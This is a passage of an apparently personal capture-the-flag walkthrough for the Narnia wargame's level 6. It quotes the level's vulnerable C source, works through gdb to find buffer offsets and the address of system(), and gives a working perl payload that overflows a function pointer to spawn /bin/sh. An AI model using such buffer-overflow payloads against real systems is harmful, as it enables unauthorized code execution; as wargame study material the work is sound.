@@ -273,3 +273,86 @@ Page 14 from https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatst
 Note: 472=500-(4 bytes for ret + 24 bytes (8 bytes for each of the three %x's returned)
 This command worked and I was now narnia6!
 #Level6
+Source code for level6:
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+extern char **environ;
+
+// tired of fixing values...
+// - morla
+unsigned long get_sp(void) {
+       __asm__("movl %esp,%eax\n\t"
+               "and $0xff000000, %eax"
+               );
+}
+
+int main(int argc, char *argv[]){
+    char b1[8], b2[8];
+    int  (*fp)(char *)=(int(*)(char *))&puts, i;
+
+    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
+
+    /* clear environ */
+    for(i=0; environ[i] != NULL; i++)
+        memset(environ[i], '\0', strlen(environ[i]));
+    /* clear argz    */
+    for(i=3; argv[i] != NULL; i++)
+        memset(argv[i], '\0', strlen(argv[i]));
+
+    strcpy(b1,argv[1]);
+    strcpy(b2,argv[2]);
+    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
+    if(((unsigned long)fp & 0xff000000) == get_sp())
+        exit(-1);
+    fp(b1);
+
+    exit(1);
+}
+```
+Ok, so this has two 8 byte char arrays b1 and b2 and we are copying the first
+two command line arguments in to these values using the dangerous strcpy
+function.  After the strcpys are done, we check to see if  fp()&0xff000000 == get_sp().
+fp() is a function pointer to the puts() function and is going to be called as
+long as  the high byte of the ESP isn't the same as the high byte of fp.  fp is
+located right after the b1,b2 declarations, so looks like something we can
+easily overflow.  The argument being passed to fp is b1 (which we also
+control), so maybe we can overflow fp with the address of system() and set b1
+to '/bin/sh'.
+Time to open up gdb!
+I open up gdb and set a breakpoint on the call to get_sp() and run the next
+instruction.  At this point EAX = 0xff000000.  Okay, so I know I need to
+overflow fp to not have 0xff in the high byte.  Let's print out the locations
+of a few variables.
+Unfortunately symbols have been stripped, so `print $b1` doesn't work.
+Fortunately this is a pretty short file and the assembly is pretty clear. In
+order to exploit this, I'll probably need to know the address of b1,b2 and fp.
+Looking at the C, the calls to strcpy are the easiest to get the addresses of
+b1/b2 and the direct call to fp is the easiest way to get fp's address.
+I set a breakpoint in strcpy and print the stack (x/10wx $esp) to get
+that the location of b1 as 0xffffd6b0 and b2 as 0xffffd6a8.
+The call to fp looks like:
+```
+ 0x080486ae <+341>: mov    eax,DWORD PTR [esp+0x28]
+   0x080486b2 <+345>:   call   eax
+```
+Printing this out:
+```
+(gdb) print $esp+0x28
+$4 = (void *) 0xffffd6b8
+```
+So b2-fp = 0x10 and b1-fp=0x8 and b2-b1=0x8
+So if we set b1 to 8 bytes followed by system() and set b2 to 8 bytes followed
+by "/bin/sh", we'll be able to change the fp(b1) call to actually be
+system("/bin/sh");
+Let's get the address of system:
+```
+(gdb) print &system
+$7 = (<text variable, no debug info> *) 0xf7e62e70 <system>
+```
+r `perl -e 'print "A"x8 . "\x70\x2e\xe6\xf7" . " ". "B"x8 . "/bin/sh"'`
+And it worked!
+#Level7
+
